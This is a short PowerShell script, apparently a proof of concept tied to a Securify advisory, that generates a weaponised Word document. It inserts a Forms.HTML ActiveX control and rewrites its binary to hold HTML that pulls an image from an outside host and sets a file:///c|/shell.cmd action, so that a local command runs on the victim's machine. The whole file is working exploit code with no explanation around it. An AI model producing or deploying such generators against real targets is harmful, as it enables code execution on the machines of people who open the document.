# target file path
$filename = [Environment]::GetFolderPath('Desktop') + '\Forms.HTML.docx'
$progid = 'Forms.HTML:Image.1'
$clsid = '5512D112-5CC6-11CF-8D67-00AA00BDCE1D'
$html = '<x type="image" src="https://securify.nl/blog/SFY20180801/packager.emf" action="file:///c|/shell.cmd">'

# load assemblies for changing the docx (zip) file
[void] [Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem')
[void] [Reflection.Assembly]::LoadWithPartialName('System.IO.Compression')

# create new Word document
$word = New-Object -ComObject Word.Application
$word.Visible = $false
$doc = $word.documents.add()

$shape = $doc.InlineShapes.AddOLEControl($progid)

# save doc & close Word
$doc.SaveAs($filename)
$doc.Close($false)
$word.Quit()

# create temp folder for modifying the docx
$tmpfolder = "$env:TEMP\" + [System.Guid]::NewGuid()
$null = New-Item -Type directory -Path $tmpfolder

# unzip and replace ActiveX object
[System.IO.Compression.ZipFile]::ExtractToDirectory($filename, $tmpfolder)
Remove-Item "$tmpfolder\word\activeX\activeX1.bin"

$clsid = ([GUID]$clsid).ToByteArray()
$clsid | Set-Content "$tmpfolder\word\activeX\activeX1.bin" -Encoding Byte
$html | Add-Content "$tmpfolder\word\activeX\activeX1.bin" -Encoding Unicode

# rezip
Remove-Item $filename
[System.IO.Compression.ZipFile]::CreateFromDirectory($tmpfolder, $filename)

# cleanup
Remove-Item $tmpfolder -Force -Recurse